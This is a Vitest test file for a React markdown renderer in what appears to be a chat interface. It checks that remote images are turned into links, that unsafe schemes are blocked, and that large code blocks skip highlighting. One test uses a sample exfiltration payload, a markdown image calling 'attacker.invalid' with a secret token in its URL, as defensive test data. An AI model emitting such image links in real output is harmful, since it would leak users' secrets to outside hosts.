import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import SettledMarkdown from "../src/features/conversation/SettledMarkdown";

describe("SettledMarkdown image privacy", () => {
	it("renders remote images as explicit links without an eager image request", () => {
		const html = renderToStaticMarkup(
			createElement(SettledMarkdown, {
				text: "![Remote evidence](https://attacker.invalid/leak?secret=TOKEN)",
			}),
		);

		expect(html).toContain('data-markdown-image-link="true"');
		expect(html).toContain('href="https://attacker.invalid/leak?secret=TOKEN"');
		expect(html).not.toContain("<img");
		expect(html).not.toContain('rel="preload"');
	});

	it("does not expose unsafe image schemes as links", () => {
		const html = renderToStaticMarkup(
			createElement(SettledMarkdown, {
				text: "![Inline](data:image/svg+xml,unsafe)",
			}),
		);

		expect(html).toContain('data-markdown-image-blocked="true"');
		expect(html).not.toContain("<img");
		expect(html).not.toContain("href=");
	});

	it("intercepts language-diff and language-patch code blocks into DiffBlock", () => {
		const diffMarkdown = "```diff\n@@ -1,2 +1,2 @@\n-old\n+new\n```";
		const html = renderToStaticMarkup(
			createElement(SettledMarkdown, {
				text: diffMarkdown,
			}),
		);

		expect(html).toContain("data-diff-block");
		expect(html).toContain("bg-success-soft/30");
		expect(html).toContain("bg-danger-soft/30");
	});

	it("bypasses DiffBlock when diff exceeds 32KB / 64KB circuit breaker and renders plain pre code", () => {
		// Create a diff larger than 32KB
		const largeDiff = `\`\`\`diff\n${"- old line\n+ new line\n".repeat(2000)}\`\`\``;
		const html = renderToStaticMarkup(
			createElement(SettledMarkdown, {
				text: largeDiff,
			}),
		);

		expect(html).not.toContain("data-diff-block");
		expect(html).toContain("<pre><code");
	});

	it("skips syntax highlighting for generic code blocks exceeding 32KB / 64KB circuit breaker", () => {
		const largeCode = `\`\`\`ts\n${"const a = 1;\n".repeat(3000)}\`\`\``;
		const html = renderToStaticMarkup(
			createElement(SettledMarkdown, {
				text: largeCode,
			}),
		);

		// Should not have hljs span token explosion
		expect(html).not.toContain('<span class="hljs-');
		expect(html).toContain("<pre><code");
	});
});
